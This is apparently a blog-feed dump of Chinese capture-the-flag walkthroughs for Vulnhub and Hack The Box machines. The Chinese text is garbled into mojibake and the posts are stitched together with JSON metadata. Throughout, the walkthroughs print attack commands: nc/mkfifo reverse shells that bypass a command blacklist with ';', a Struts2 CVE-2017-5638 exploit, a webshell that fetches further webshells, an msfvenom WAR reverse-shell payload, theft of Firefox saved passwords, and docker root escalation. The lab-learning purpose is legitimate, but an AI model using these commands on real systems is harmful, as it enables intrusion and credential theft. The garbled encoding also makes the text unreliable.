ç¬¬ä¸€æ­¥ä½¿ç”¨kaliæ‰«æå†…ç½‘IP Arp-scan â€“l è·å¾—é¶åœºIPä¸º192.168.72.132 å¯¹é¶åœºè¿›è¡Œç«¯å£æ‰«æ Nmap â€“A â€“v 192.168.72.132 å‘ç°å­˜åœ¨21 22 80ä¸‰ä¸ªç«¯å£ 21ç«¯å£å­˜åœ¨åŒ¿åè®¿é—® å’±ä»¬å…ˆè®¿é—®çœ‹çœ‹ ç”¨æˆ·åä½¿ç”¨anonymous å¯†ç ä¸ºç©º æˆåŠŸç™»é™† æŸ¥çœ‹æœ‰ä»€ä¹ˆæ–‡ä»¶ å‘ç°å­˜åœ¨ä¸€ä¸ªtxtæ–‡ä»¶ æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ ä½¿ç”¨getä¸‹è½½åˆ°æœ¬åœ°ç„¶åæ‰“å¼€æŸ¥çœ‹ å—¯â€¦å¥½åƒä¹Ÿæ²¡ä»€ä¹ˆç”¨ æˆ‘ä»¬è¿˜æ˜¯å…ˆçœ‹çœ‹80ç«¯å£çš„WebæœåŠ¡å§ çœ‹ä¸Šå»åƒæ˜¯ä¸€ä¸ªä½“è‚²æ¯”èµ›çš„å®˜ç½‘ï¼Ÿ æ‰«æä¸€ä¸‹ç›®å½• å‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„URL http://192.168.72.132/secret/index.php å¯ä»¥æ‰§è¡Œå‘½ä»¤ OK çªç ´å£åº”è¯¥å°±åœ¨è¿™é‡Œäº† å½“æˆ‘è¾“å…¥lsæƒ³æŸ¥çœ‹ä¸€ä¸‹å½“å‰ç›®å½•æ–‡ä»¶çš„æ—¶å€™ è¿™æ—¶æˆ‘æƒ³èµ·æ¥æˆ‘ä»¬é‚£ä¸ªnote.txtæ–‡ä»¶é‡Œçš„è¯æ˜¯ä»€ä¹ˆæ„æ€ è¯æ˜è¿™é‡Œæœ‰è¿‡æ»¤ å°±æ˜¯ä¸çŸ¥é“æ˜¯ç™½åå•è¿˜æ˜¯é»‘åå•äº† ç»è¿‡æˆ‘å¤§é‡æµ‹è¯• è¯¥é¶åœºä¸ºé»‘åå•éªŒè¯ é‚£å°±å¥½åŠäº† ç»•è¿‡å§ å‡ºå»åƒäº†ä¸ªé¥­ å›æ¥çªç„¶æ¥äº†æ€è·¯ å°†ä¸¤ä¸ªæŒ‡ä»¤ç»“åˆèµ·æ¥ ä¸å°±æˆäº†å— ä¾‹å¦‚ lsä¼šè¢«æ‹¦æˆª é‚£å°± whoami;ls æˆåŠŸæ‰§è¡Œ æˆ‘å¯çœŸæ˜¯ä¸ªå°æœºçµ å°†è¯¥æ–¹æ³•å’ŒNCåå¼¹ä¸€ç»“åˆ ä¸å°±æ‹¿åˆ°shelläº†ï¼Ÿ ç»è¿‡å¤§é‡æµ‹è¯• å‘ç°å¯ç”¨çš„åå¼¹è¯­å¥ä¸º dir;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.72.130 7777 &gt; &#x2F;tmp&#x2F;f æœ¬æœºç›‘å¬ nc â€“lvp 7777 æ‰§è¡Œ æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªshell è¯¥shellæƒé™è¿˜æ˜¯è¾ƒä½ å¹¶ä¸”æ“ä½œéå¸¸ä¸ä¾¿åˆ© å’±ä»¬è¦æƒ³åŠæ³•ææƒ æŸ¥æ‰¾pythonç‰ˆæœ¬ Which python æˆåŠŸç¡®è®¤pythonç‰ˆæœ¬ä¸ºpython3 ä½¿ç”¨python3å°†shellè¿›è¡Œæå‡ python3 -c â€˜import pty;pty.spawn(â€œ&#x2F;bin&#x2F;bashâ€)â€™ æˆåŠŸ è¯¥å‘½ä»¤ä¸ä¼šå¯¹ç”µè„‘æœ‰ä»€ä¹ˆå±å®³ ä½†å¶å°”ä¼šæœ‰å¥‡æ•ˆ åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹ è¿™ä¸ªhacker.phpå¼•èµ·äº†æˆ‘çš„æ³¨æ„ æŸ¥çœ‹ä¸€ä¸‹å§ åœ¨é»‘æš—ä¸­æˆ‘ä¼šçœ‹åˆ°ç­”æ¡ˆï¼ŸçœŸå°±äººå‡è°œè¯­äººå‘— åœ¨hacker.phpä¸­ æˆ‘ä»¬çœ‹åˆ°imagesæ–‡ä»¶å¤¹ä¸­æœ‰ä¸€å¼ å›¾ç‰‡ åº”è¯¥å°±æ˜¯çº¿ç´¢æ‰€åœ¨ å’±ä»¬è¿›å…¥imagesæ–‡ä»¶å¤¹ OK å’±ä»¬æŠŠè¿™å¼ å›¾ç‰‡ç”¨ncä¸‹è½½ä¸‹æ¥ ä¹Ÿå¯ä»¥ç”¨python3å¼€å¯httpæœåŠ¡è¿›è¡Œä¸‹è½½ ä¸è¿‡æˆ‘å›¾çœäº‹å„¿ å°±ncäº†å§ æœ¬åœ°ç”µè„‘è¿è¡Œ nc â€“nvlp 4444 &gt; hacker-with-laptop_23-2147985341.jpg å’±ä»¬ä¿æŒåŸåä¸åŠ¨ Shellé‡Œè¿è¡Œ nc 192.168.72.130 4444 -w 4 &lt; hacker-with-laptop_23-2147985341.jpg OK ç¨ç­‰ä¸€ä¼šå„¿ æˆåŠŸä¸‹è½½ä¸‹æ¥ æ ¹æ®hacker.phpä¸­çš„æç¤º åœ¨é»‘æš—ä¸­æˆ‘ä»¬ä¼šçœ‹åˆ°ç­”æ¡ˆ è¿™ä¸å°±æ˜¯å¦¥å¦¥çš„å›¾ç‰‡éšå†™å— ä¸æ„§æ˜¯æˆ‘ æœ€è¿‘çš„æŸ¯å—æ²¡ç™½çœ‹ ä½¿ç”¨steghideæŸ¥çœ‹ æœç„¶å­˜åœ¨ä¸€ä¸ªåä¸ºbackup.zipçš„å‹ç¼©åŒ… ä¸æ„§æ˜¯æˆ‘ ä¾ç„¶ä½¿ç”¨steghideè¿›è¡Œè§£å‹ OK å¾—åˆ°äº†è¿™ä¸ªåä¸ºbackup.zipçš„å‹ç¼©åŒ…æ–‡ä»¶ æˆ‘ä»¬ç°åœ¨å°†ä»–è§£å‹ç¼© æˆ‘ä¸¢å•Š è¿™é‡Œæ¥ä¸ªå¯†ç  æˆå§ å†æ‰¾ æ‰¾ï¼Ÿæ‰¾æ˜¯ä¸å¯èƒ½æ‰¾çš„ å°±å’±è¿™æš´è„¾æ°” çˆ†ä»–ï¼ ä½¿ç”¨zip2johbç”Ÿæˆäº†ä¸€ä¸ªbackup.johnæ–‡ä»¶ å’±ä»¬ä½¿ç”¨johnçˆ†ä»– OK å®Œæˆ å’±ä»¬ä½¿ç”¨johnæŸ¥çœ‹å¯†ç  å¯†ç ä¸ºpass1word è¡Œå§ ç»å…¸å¼±å£ä»¤ æ¥ä¸‹æ¥å’±ä»¬è§£å‹æ–‡ä»¶ æˆåŠŸè§£å‹å‡ºæ¥ æŸ¥çœ‹è§£å‹å‡ºæ¥çš„æ–‡ä»¶ å¥½å®¶ä¼™ è¿˜æœ‰ä¸ªbase64ç¼–ç  è§£å¯†å§ è¿”å›æˆ‘ä»¬çš„shell æŸ¥çœ‹ä¸€ä¸‹ç”¨æˆ· ä½¿ç”¨æˆ‘ä»¬å¾—åˆ°çš„å¯†ç ç™»å…¥è¿›ç”¨æˆ·anurodh æˆåŠŸç™»å…¥ ç¡®è®¤è´¦æˆ·å¯†ç æ²¡é—®é¢˜äº† è¿™æ—¶å€™å’±ä»¬å°±è¦ç”¨åˆ°ä¸€å¼€å§‹æ‰«æå‡ºçš„22ç«¯å£äº† æ¯•ç«Ÿshellæ˜¯ä¸ç¨³å®šçš„ ä½¿ç”¨sshæœåŠ¡ç™»å…¥å§ æˆåŠŸç™»å…¥ æœ‰ä¸€ä¸ªç¨³å®šçš„æƒé™çš„æ„Ÿè§‰å¤ªçˆ½äº† è¿™æ—¶å€™è‚¯å®šå°±æ˜¯ææƒäº†æ˜¯å§ ç›´æ¥ä½¿ç”¨ç»å…¸çš„sudo su å¤±è´¥äº† å—¯â€¦ æƒ…ç†ä¹‹ä¸­ æ„æ–™ä¹‹å¤– ä½¿ç”¨sudo â€“læŸ¥çœ‹sudoçš„æƒé™ å‘ç°apaarå¯ä»¥ææƒï¼Ÿé‚£å°±é€ ä»– æŸ¥çœ‹apaaræ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ å‘ç°apaarä¸‹æœ‰ä¸ªtxtæ–‡ä»¶ ä½†ç”±äºæƒé™æ–‡ä»¶æˆ‘ä»¬æ— æ³•è®¿é—® ä½†ä¸Šè¿°æåˆ°äº† apaarä¸‹æœ‰ä¸ªshè„šæœ¬æˆ‘ä»¬å¯ä»¥æ‰§è¡Œ é‚£å°±æ‰§è¡Œå®ƒ å®ƒéœ€è¦ä¸€ä¸ªåå­— å’±ä»¬éšä¾¿è¾“å…¥å³å¯ æ‰§è¡Œå®Œæ¯•äº† ä½†æˆ‘ä¸çŸ¥é“å®ƒæœ‰æ•ˆæœ é‚£å°±é˜…è¯»ä¸€ä¸‹å§ è¿™ä¸ªæ‰¹å¤„ç† æœ‰ç‚¹æ„æ€å•Š ä¼¼ä¹å¯ä»¥å‘½ä»¤æ‰§è¡Œ å°è¯•æˆåŠŸ æœ‰ç‚¹æ„æ€ æ—¢ç„¶æˆ‘ä»¬æ²¡æœ‰æƒé™è¯»å–local.txtæ–‡ä»¶ é‚£å°±è®©apaaræ¥è¯»å–å§ å•Šè¿™ æˆ‘è¿˜ä»¥ä¸ºæ˜¯ä»€ä¹ˆææƒçš„ä¸œè¥¿å‘¢ ç»“æœä½ å‘Šè¯‰æˆ‘ è¿™å°±æ˜¯ä¸ªflagï¼Ÿ é‚£ä¹Ÿè¡Œå§ flag1 get {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww} OK å’±ä»¬ç»§ç»­æ‰¾å…¶ä»–æ–¹æ³•ææƒå§ è¾“å…¥idæŸ¥çœ‹æƒé™ å—¯ï¼Ÿdockerï¼Ÿè¦ç´ å¯Ÿè§‰ æˆ‘ä»¬ä½¿ç”¨ä¸€äº›ææƒè¾…åŠ©å·¥å…·https://gtfobins.github.io/ åœ¨é‡Œé¢æœæœdocker ä½¿ç”¨æ­¤å‘½ä»¤å³å¯ææƒdocker run -v &#x2F;:&#x2F;mnt â€“rm -it alpine chroot &#x2F;mnt sh ææƒæˆåŠŸ è¿›å…¥rootç›®å½• æ‹¿åˆ°æœ€åä¸€ä¸ªflag Flag2 get {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg} æ€»ç»“è¯­ï¼šæ€ä¹ˆè¯´å‘¢ï¼Œè¿™ä¸ªé¶åœºè¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚æˆ‘èµ·åˆä»¥ä¸ºå°±æ˜¯ç®€å•çš„ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œgetshellä»¥åä¸€ä¸ªè„šæœ¬ææƒå°±æ‹¿ä¸‹äº†ã€‚æ²¡æƒ³åˆ°è¿˜æœ‰è¿™ä¹ˆå¤šæ­¥éª¤ï¼ŒæŒºä¸¥è°¨çš„å§","categories":[],"tags":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://www.lucifiel.com/tags/Vulnhub/"}]},{"title":"BlueSky - Vulnhub","slug":"Vulnhub  - BlueSky","date":"2021-10-07T08:31:38.000Z","updated":"2023-05-19T10:37:07.000Z","comments":true,"path":"2021/10/07/Vulnhub  - BlueSky/","link":"","permalink":"http://www.lucifiel.com/2021/10/07/Vulnhub%20%20-%20BlueSky/","excerpt":"","text":"é¶åœºå®æˆ˜ Vulnhub-BlueSkyé¦–å…ˆä½¿ç”¨kaliæ‰«æé¶åœºçš„IPåœ°å€ Arp-scan â€“l å¯¹æ¯”MACåœ°å€ æˆåŠŸå¾—åˆ°é¶åœºIPåœ°å€192.168.72.131 è¿›è¡Œç«¯å£æ‰«æ Nmap â€“Sv â€“v 192.168.72.131 å¼€æ”¾äº†ç«¯å£22å’Œ8080 22ä¸ºSSHç«¯å£ï¼Œçªç ´å¤šåŠéƒ½æ˜¯å¼±å£ä»¤ï¼Œå’±ä»¬å…ˆä¸è€ƒè™‘è¿™ç§æƒ…å†µï¼Œè®¿é—®8080çš„WEBæœåŠ¡å™¨çœ‹çœ‹ http://192.168.72.131:8080 è®¿é—®åå‘ç°æ˜¯tomcat 9.0.40 ç¬¬ä¸€æ—¶é—´æƒ³åˆ°äº†tomcatçš„cveæ¼æ´ ä½¿ç”¨searchsploitæœç´¢ tomcat 9.0.40çš„æ¼æ´ å—¯â€¦å¥½åƒæ²¡æœ‰ é‚£å°±æµ‹è¯•ä¸€æ³¢0dayå§(å¼±å£ä»¤) Tomcat&#x2F;tomcat Admin&#x2F;admin OK ç¡®è®¤æ²¡æœ‰0day é‚£å°±åªèƒ½æ‰¾è¯¥ç‰ˆæœ¬å­˜åœ¨çš„æ¼æ´äº† åœ¨ç™¾åº¦æ‰¾åˆ°ä¸€ä¸ªstruts2-showcaseçš„æ¼æ´ï¼ˆs2-048è¿œç¨‹ä»£ç æ‰§è¡Œï¼‰ å¥½å®¶ä¼™ ç›´æ¥ä¸Šå·¥å…·äº†å“ˆ å°±æ‡’å¾—å†æµ‹è¯•äº† url: http://192.168.72.131:8080/struts2-showcase/index.action å¥½å®¶ä¼™ è¿™ä¸ªURLæˆ‘çˆ†ç›®å½•è¿˜æ²¡çˆ†å‡ºæ¥ åœ¨ç½‘ä¸Šæœç´¢ç›¸å…³æ¼æ´æ‰æ‰¾åˆ° ä¸‹è½½exp git clone https://github.com/jrrdev/cve-2017-5638.git æµ‹è¯•æ˜¯å¦å­˜åœ¨æ¼æ´ python exploit.py â€œhttp://192.168.72.131:8080/struts2-showcase/index.action&quot; â€œwhoamiâ€ whoamiæ‰§è¡ŒæˆåŠŸ æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ncæƒé™ python exploit.py â€œhttp://192.168.72.131:8080/struts2-showcase/index.action&quot; â€œncâ€ å­˜åœ¨ncæƒé™çš„ ä½†ä¼¼ä¹æ²¡æœ‰nc â€“eçš„æƒé™ å¾—é€šè¿‡å…¶ä»–æ–¹å¼åå¼¹shelläº† é¦–å…ˆä½¿ç”¨mknodå»ºç«‹ç®¡é“ Python exploit.py â€œhttp://192.168.72.131:8080/struts2-showcase/index.action&quot; â€œmknod &#x2F;tmp&#x2F;backpipe pâ€ Kaliç›‘å¬4444ç«¯å£ Nc â€“nvlp 4444 åå¼¹shellï¼Œå°†å†…å®¹ä¼ é€’ç‰©ä½¿ç”¨ç®¡é“æ–‡ä»¶pä½œä¸ºæ¡¥æ¢ï¼Œè¿›è¡Œæ•°æ®é‡å®šå‘ä¼ é€’ python exploit.py â€œhttp://192.168.72.131:8080/struts2-showcase/index.action&quot; -c â€œ&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;p | nc 192.168.72.133 4444 1&gt;&#x2F;tmp&#x2F;pâ€ æ­£å¸¸æ¥è¯´ç°åœ¨kaliæ˜¯ä¼šè·å–åˆ°ä¸€ä¸ªncçš„shellçš„ï¼Œä½†æˆ‘è¿™è¾¹ä¸çŸ¥é“ä»€ä¹ˆåŸå› æ— æ³•æˆåŠŸï¼Œå…ˆæ•™å¤§å®¶æ­¤æ–¹æ³•ç»§ç»­æ“ä½œçš„æ–¹æ³•ï¼Œæˆ‘å†æ¼”ç¤ºæˆ‘è‡ªå·±åšçš„æ›¿ä»£çš„æ–¹æ³• è·å–åˆ°shellååœ¨shellå†…è¿è¡Œ python3 -c â€˜import pty; pty.spawn(â€œ&#x2F;bin&#x2F;bashâ€)â€™ å› ä¸ºé¶æœºç¯å¢ƒå†…æ²¡æœ‰python2çš„ç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨python3æå‡ä¸ºä¸€ä¸ªäº¤äº’å¼shellå°±å¯ä»¥äº† ç¬¬äºŒç§æ–¹æ³•ï¼š ç¬¬äºŒç§æ–¹æ³•æˆ‘ä»¬ä½¿ç”¨windowæ¥è¿›è¡Œæ¸—é€ é¦–å…ˆä½¿ç”¨struts2çš„å›¾å½¢åŒ–éªŒè¯å·¥å…·è¿›è¡Œæ¼æ´éªŒè¯ å¾—åˆ°ç›®å½•åœ°å€ webpath:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;struts2-showcase&#x2F; ç›´æ¥ä¸Šä¼ å¤§é©¬ä¼šè¶…å‡ºå­—èŠ‚é™åˆ¶ ä¸Šä¼ å†°èçš„é©¬å†°èä¼šæ— æ³•è¯†åˆ«webshellçš„å¯†ç  ç›´æ¥ä¸Šä¼ èšå‰‘çš„é©¬ä¹Ÿä¼šè¶…å‡ºå­—èŠ‚é™åˆ¶ é‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿ å¾ˆå¥½è§£å†³ï¼Œé¦–å…ˆæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªä¸‹è½½æ–‡ä»¶çš„ä¸€å¥è¯æœ¨é©¬ å¾—åˆ°webshellåœ°å€ http://192.168.72.131:8080/struts2-showcase/111.jsp ç„¶ååœ¨æœ¬åœ°æ­å»ºä¸€ä¸ªwebæœåŠ¡å™¨ï¼ŒæŠŠè¦ä½¿ç”¨çš„ä¸€å¥è¯æœ¨é©¬æˆ–å¤§é©¬æ”¾åœ¨é‡Œé¢ï¼Œä½¿ç”¨è¯¥ä¸€å¥è¯æœ¨é©¬è¿›è¡Œè®¿é—®ä¸‹è½½ http://192.168.72.131:8080/struts2-showcase/111.jsp?f=/usr/local/tomcat/webapps/struts2-showcase/222.jsp&u=http://192.168.0.159/333.jsp ä¸Šé¢çš„222.jspæ˜¯è¦ä¿å­˜çš„webshellé©¬åå­— 333.jspæ˜¯æˆ‘ä»¬åœ¨æœ¬åœ°webæœåŠ¡å™¨å†…å‚¨å­˜çš„åå­— 111.jspæ˜¯å½“å‰çš„ä¸‹è½½é©¬ æˆåŠŸä¸‹è½½èšå‰‘çš„ä¸€å¥è¯æœ¨é©¬ å¯ä»¥æˆåŠŸè®¿é—®æ–‡ä»¶ï¼Œä½†æˆ‘ä»¬å‘ç°è¯¥ä¸€å¥è¯æœ¨é©¬ä¼¼ä¹æ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿ å°é—®é¢˜ï¼Œæˆ‘ä»¬åˆ©ç”¨tomcatæœ¬èº«çš„æ¼æ´è¿›è¡Œææƒå°±å¥½äº† é¦–å…ˆæ‰¾åˆ°tomcatçš„è´¦å·æœ¨é©¬ åœ°å€ï¼š&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;conf&#x2F;tomcat-users.xml ç¬¬45è¡Œ æˆåŠŸå¾—åˆ° è´¦å·ï¼šadmin å¯†ç ï¼š6mzf3&gt;gfZ.pN8_Mp æ³¨æ„ï¼šæ­¤æ–¹æ³•è¾ƒä¸ºéº»çƒ¦ï¼Œä¸»è¦ç”¨äºæ— æ³•ä½¿ç”¨ncå¼¹å›shellçš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œæˆ‘è¿™è¾¹ä½¿ç”¨äº†å„ä¸ªæ–¹æ³•éƒ½æ— æ³•å¼¹å›ï¼Œä¸å¾—å·²ä¹‹ä¸‹æ‰ä½¿ç”¨è¿™ä¸ªæ–¹æ³• ç°åœ¨æˆ‘ä»¬å›åˆ°ç½‘é¡µå»ç™»å½•è´¦å·å¯†ç  ç™»é™†åçš„çŠ¶æ€ æˆ‘ä»¬å‘ç°ä¸‹é¢å¯ä»¥éƒ¨ç½²æ–‡ä»¶ï¼ŒOK é‚£å°±å¥½åŠäº† ä½¿ç”¨WARæœ¨é©¬ä¸Šä¼ åå¼¹shellå°±æå®šäº† ä½¿ç”¨msfvenomç”Ÿæˆwaré©¬ msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.72.133 LPORT&#x3D;5555 -f war -o shell.war OK æˆ‘ä»¬å»ä¸Šä¼  æˆåŠŸä¸Šä¼ åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°&#x2F;shell è¿™å°±æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„waré©¬ åœ¨kaliä¸­ç›‘å¬5555ç«¯å£ Nc â€“nvlp 5555 ç„¶åå»è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„waré©¬ curl http://192.168.72.131:8080/shell/ OK æˆ‘ä»¬æˆåŠŸè·å–åˆ°ä¸€ä¸ªshell åŒæ ·çš„æˆ‘ä»¬ä½¿ç”¨python3è·å–ä¸€ä¸ªäº¤äº’å¼shell python3 -c â€˜import pty; pty.spawn(â€œ&#x2F;bin&#x2F;bashâ€)â€™ æŸ¥çœ‹user.txtæ–‡ä»¶ æˆåŠŸè·å–userè´¦æˆ·çš„flag æˆ‘ä»¬æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶ Ls â€“a åœ¨ç”¨æˆ·æ ¹ç›®å½•ä¸‹å‘ç°mozilla firefoxæµè§ˆå™¨æ–‡ä»¶ å¯¹æˆ‘æ¥è¯´ï¼Œæœ€æƒ³è¦å¾—åˆ°çš„å°±æ˜¯å®ƒçš„ç”¨æˆ·åå¯†ç è®°å½• ä¸åŒç‰ˆæœ¬çš„Firefoxä¿å­˜å¯†ç è®°å½•çš„æ–‡ä»¶åç§°ä¸åŒï¼Œåœ¨ç½‘ä¸Šæ‰¾åˆ°firefoxæµè§ˆå™¨å­˜å‚¨ç”¨æˆ·åå¯†ç çš„æ–‡ä»¶æ˜¯logins.jsonï¼ˆç‰ˆæœ¬å·å¤§äºç­‰äº32.0ï¼‰æˆ–è€…signons.sqliteï¼ˆç‰ˆæœ¬å·å¤§äºç­‰äº3.5ï¼Œå°äº32.0ï¼‰ï¼Œ å…·ä½“ä¿¡æ¯å‚è€ƒï¼šhttp://kb.mozillazine.org/Profile_folder_-_Firefox è¿›å…¥ä½ç½® .mozilla&#x2F;firefox&#x2F;fvbljmev.default-release å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªæ–‡ä»¶ key4.db logins.json æˆ‘ä»¬è¦æŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶æå‡ºæ¥ ä½¿ç”¨python3å¼€å¯webæœåŠ¡å™¨ python3 -m http.server 6666 ä½¿ç”¨wgetæˆåŠŸæ‹·è´ä¸¤ä¸ªæ–‡ä»¶ wget http://192.168.72.131:6666/logins.json wget http://192.168.72.131:6666/key4.db ä¸‹è½½è§£å¯†è„šæœ¬ https://github.com/lclevy/firepwd git clone https://github.com/lclevy/firepwd.git cd firepwd pip3 install -r requirements.txt è¿è¡Œpython3 firepwd.py https://twitter.com:b'minhtuan',b'skysayohyeahâ€˜ å¾—åˆ°è´¦å·ï¼šminhtuan å¾—åˆ°å¯†ç ï¼šskysayohyeah æˆ‘ä»¬ä½¿ç”¨sudo â€“læŸ¥çœ‹sudoæƒé™ æƒé™æŒºé«˜ ç›´æ¥sudo suå³å¯æˆåŠŸææƒ æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag æœ¬æ¬¡é¶åœºå®Œæˆ","categories":[],"tags":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://www.lucifiel.com/tags/Vulnhub/"}]},{"title":"Forge - Hackthebox","slug":"Hackthebox - Forge","date":"2021-09-28T11:38:36.000Z","updated":"2023-05-20T01:49:39.000Z","comments":true,"path":"2021/09/28/Hackthebox - Forge/","link":"","permalink":"http://www.lucifiel.com/2021/09/28/Hackthebox%20-%20Forge/","excerpt":"","text":"Hackthebox - Forgeé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†é¦–å…ˆä½¿ç”¨nmapæ‰«æä¸€ä¸‹ç«¯å£ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.111 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 21:51 EDT Warning: 10.10.11.111 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.111 Host is up (0.35s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA) | 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA) |_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-title: Did not follow redirect to http://forge.htb No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=9/26%OT=22%CT=1%CU=32048%PV=Y%DS=2%DC=T%G=Y%TM=615123F OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 358.39 ms 10.10.14.1 2 358.42 ms 10.10.11.111 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 71.65 seconds è¿™è¾¹åªå¼€äº†22å’Œ80ç«¯å£ï¼Œå’±ä»¬å»çœ‹çœ‹80ç«¯å£çš„httpæœåŠ¡å†…å®¹ è®¿é—®åç›´æ¥è¢«è·³è½¬åˆ°äº†forge.htbåŸŸåï¼Œè¿™é‡Œå’±ä»¬åŠ ä¸€ä¸ªåŸŸåè§£æ echo 10.10.11.111 forge.htb &gt;&gt; /etc/hosts ç„¶åå†è®¿é—®ä¸€æ¬¡ è¿™é‡Œæœ‰ä¸ªä¸Šä¼ åŠŸèƒ½ï¼Œå»è¯•ä¸€ä¸‹æ˜¯å¦å¯ä»¥ä¸Šä¼  ä¸Šä¼ åä¼šè¢«å»æ‰åç¼€ï¼Ÿè¿˜æ˜¯æ€ä¹ˆç€ä¸å¤ªæ˜ç™½ï¼Œåæ­£æ²¡æœ‰è§£æï¼Œæ‰¾ä¸€ä¸‹å…¶ä»–æ€è·¯å§ ä¸»é¡µä¸Šæ²¡æœ‰ä»€ä¹ˆå¯çœ‹çš„ä¸œè¥¿äº†ï¼Œçˆ†ä¸€ä¸‹ç›®å½•å’Œå­åŸŸåå§ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 200 -u http://forge.htb/ =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://forge.htb/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/09/26 22:14:58 Starting gobuster in directory enumeration mode =============================================================== http://forge.htb/uploads (Status: 301) [Size: 224] [--&gt; http://forge.htb/uploads/] http://forge.htb/static (Status: 301) [Size: 307] [--&gt; http://forge.htb/static/] http://forge.htb/upload (Status: 200) [Size: 929] http://forge.htb/server-status (Status: 403) [Size: 274] =============================================================== 2021/09/26 22:29:14 Finished =============================================================== è¿™é‡Œç›®å½•æ²¡çˆ†å‡ºä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå†å»æ‰«æDNSçœ‹çœ‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r -t 50 -u forge.htb =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://forge.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2021/09/26 22:48:35 Starting gobuster in VHOST enumeration mode =============================================================== Found: admin.forge.htb (Status: 200) [Size: 27] =============================================================== 2021/09/26 22:50:16 Finished =============================================================== æ‰¾åˆ°äº†ä¸€ä¸ªadminå­åŸŸåï¼Œæ·»åŠ åˆ°hostsåå†å»è¯•è¯• 